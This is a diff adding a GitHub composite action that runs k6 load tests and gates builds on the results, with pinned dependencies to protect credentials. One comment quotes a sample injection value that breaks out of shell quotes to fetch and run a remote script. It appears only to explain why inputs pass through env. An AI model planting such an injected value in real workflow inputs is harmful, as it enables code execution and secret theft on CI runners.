@@ -1,0 +1,152 @@
+# run-k6-action — the deterministic perf gate (delivery surface #2).
+#
+# run -> JSON summary -> compare-core -> exit code. ZERO model calls.
+# Verdict parity with the agentic loop is guaranteed by construction: both
+# surfaces execute the same compare-core.js in this folder.
+#
+# Exit contract (perf-gate.yaml `gate:` section):
+#   green / no-baseline                 -> 0
+#   red,  mode=enforce                  -> exit_code_on_red (default 99)
+#   crash (k6 exit 97 or unexpected)    -> 97 when enforce
+#   red / crash, mode=report-only       -> 0 (report-only never blocks)
+#
+# Requires a Linux runner with Node 20+. Browser scripts need Chromium — this
+# action installs it automatically when the script imports k6/browser.
+# Credentials (e.g. PERF_USERNAME / STAGING_PASSWORD) are passed by the caller
+# as step-level `env:` — k6 exposes process env to scripts via __ENV.
+
+name: run-k6-action
+description: 'Deterministic k6 perf gate: run, summary-export, compare-core verdict, exit code. Zero model calls.'
+
+inputs:
+  script:
+    description: 'Path to the k6 script (e.g. envs/demo-web/api-benchmark/script.js)'
+    required: true
+  gate-config:
+    description: 'Path to the perf-gate.yaml threshold file for this profile'
+    required: true
+  run-id:
+    description: 'Run identifier; defaults to gate_<github run id>_<attempt>'
+    required: false
+    default: ''
+  k6-version:
+    description: 'k6 version to install'
+    required: false
+    default: '2.0.0'
+  mode-override:
+    description: 'Force gate mode (report-only | enforce); empty = use gate-config'
+    required: false
+    default: ''
+
+outputs:
+  verdict:
+    description: 'green | red | fail | no-baseline'
+    value: ${{ steps.compare.outputs.verdict }}
+  summary-line:
+    description: 'One-line human verdict summary'
+    value: ${{ steps.compare.outputs.summary-line }}
+  verdict-path:
+    description: 'Path to verdict.json'
+    value: ${{ steps.run.outputs.out-dir }}/verdict.json
+  k6-exit-code:
+    description: 'Raw k6 process exit code (0 ok, 99 thresholds failed, 97 crash)'
+    value: ${{ steps.run.outputs.k6-exit-code }}
+
+runs:
+  using: composite
+  steps:
+    - name: Setup k6
+      # Pinned to a commit, not the mutable @v1 tag: this step inherits the
+      # caller's step-level env, which is where the perf credentials live, so
+      # whatever @v1 points to at run time would execute with them readable.
+      # Same reasoning as the playwright pin below. Bump deliberately.
+      uses: grafana/setup-k6-action@db07bd9765aac508ef18982e52ab937fe633a065 # v1, 2026-04-29
+      with:
+        k6-version: ${{ inputs.k6-version }}
+
+    - name: Install Chromium + Xvfb (browser scripts only)
+      shell: bash
+      # Inputs arrive via env, never via ${{ }} inside run:. GitHub expands
+      # ${{ }} textually BEFORE bash sees the line, so a caller passing
+      # `x"; curl evil.sh | sh; "` would break out of the quotes. This action is
+      # meant to be reused, and a consumer may wire an untrusted value (issue
+      # title, branch name, free-text workflow_dispatch input) straight to it.
+      env:
+        SCRIPT: ${{ inputs.script }}
+      run: |
+        if grep -qE "from ['\"]k6/browser['\"]" "$SCRIPT" 2>/dev/null; then
+          echo "k6/browser detected — installing Chromium + Xvfb"
+          sudo apt-get install -y xvfb
+          # Version-pinned on purpose: this step runs with the caller's step-level
+          # env in scope (composite steps inherit it), which is where the perf
+          # credentials live. `playwright@latest` would execute whatever was
+          # published minutes ago with those secrets readable.
+          npx --yes playwright@1.54.0 install --with-deps chromium
+          Xvfb :99 -screen 0 1280x720x24 &
+          sleep 2
+          echo "DISPLAY=:99" >> "$GITHUB_ENV"
+        else
+          echo "No k6/browser import — skipping Chromium/Xvfb install"
+        fi
+
+    - name: Run k6
+      id: run
+      shell: bash
+      env:
+        SCRIPT: ${{ inputs.script }}
+        INPUT_RUN_ID: ${{ inputs.run-id }}
+      run: |
+        set +e
+        RUN_ID="$INPUT_RUN_ID"
+        [ -z "$RUN_ID" ] && RUN_ID="gate_${GITHUB_RUN_ID:-local}_${GITHUB_RUN_ATTEMPT:-1}"
+        OUT_DIR="reports/$RUN_ID"
+        mkdir -p "$OUT_DIR"
+
+        if [ ! -f "$SCRIPT" ]; then
+          echo "FAIL — script not found: $SCRIPT" >&2
+          echo "k6-exit-code=97" >> "$GITHUB_OUTPUT"
+          echo "run-id=$RUN_ID"  >> "$GITHUB_OUTPUT"
+          echo "out-dir=$OUT_DIR" >> "$GITHUB_OUTPUT"
+          exit 0
+        fi
+
+        # browser scripts run headless
+        if grep -qE "from ['\"]k6/browser['\"]" "$SCRIPT"; then
+          export K6_BROWSER_HEADLESS=true
+        fi
+        export RUN_ID
+
+        k6 run --summary-export "$OUT_DIR/summary.json" --tag "run_id=$RUN_ID" "$SCRIPT"
+        K6_EXIT=$?
+
+        # HAR scrub interim rule (run-k6-script SKILL step 6): never persist a raw HAR
+        find "$OUT_DIR" -name '*.har' -delete 2>/dev/null || true
+
+        echo "k6 exited with $K6_EXIT (0=ok, 99=thresholds failed, 97=crash)"
+        echo "k6-exit-code=$K6_EXIT" >> "$GITHUB_OUTPUT"
+        echo "run-id=$RUN_ID"  >> "$GITHUB_OUTPUT"
+        echo "out-dir=$OUT_DIR" >> "$GITHUB_OUTPUT"
+        exit 0   # verdict + exit code are owned by compare-core, not the run step
+
+    - name: Compare to gate thresholds (compare-core)
+      id: compare
+      shell: bash
+      # Same rule as the steps above: values reach bash through env, never
+      # through ${{ }} inside run:. OUT_DIR/RUN_ID are derived from the
+      # caller's inputs, so they are caller-tainted too.
+      env:
+        MODE_OVERRIDE: ${{ inputs.mode-override }}
+        GATE_CONFIG: ${{ inputs.gate-config }}
+        OUT_DIR: ${{ steps.run.outputs.out-dir }}
+        K6_EXIT_CODE: ${{ steps.run.outputs.k6-exit-code }}
+        GATE_RUN_ID: ${{ steps.run.outputs.run-id }}
+      run: |
+        MODE_ARG=()
+        [ -n "$MODE_OVERRIDE" ] && MODE_ARG=(--mode "$MODE_OVERRIDE")
+        node "$GITHUB_ACTION_PATH/compare-core.js" \
+          --summary "$OUT_DIR/summary.json" \
+          --gate "$GATE_CONFIG" \
+          --exit-code "$K6_EXIT_CODE" \
+          --run-id "$GATE_RUN_ID" \
+          --out "$OUT_DIR/verdict.json" \
+          "${MODE_ARG[@]}"
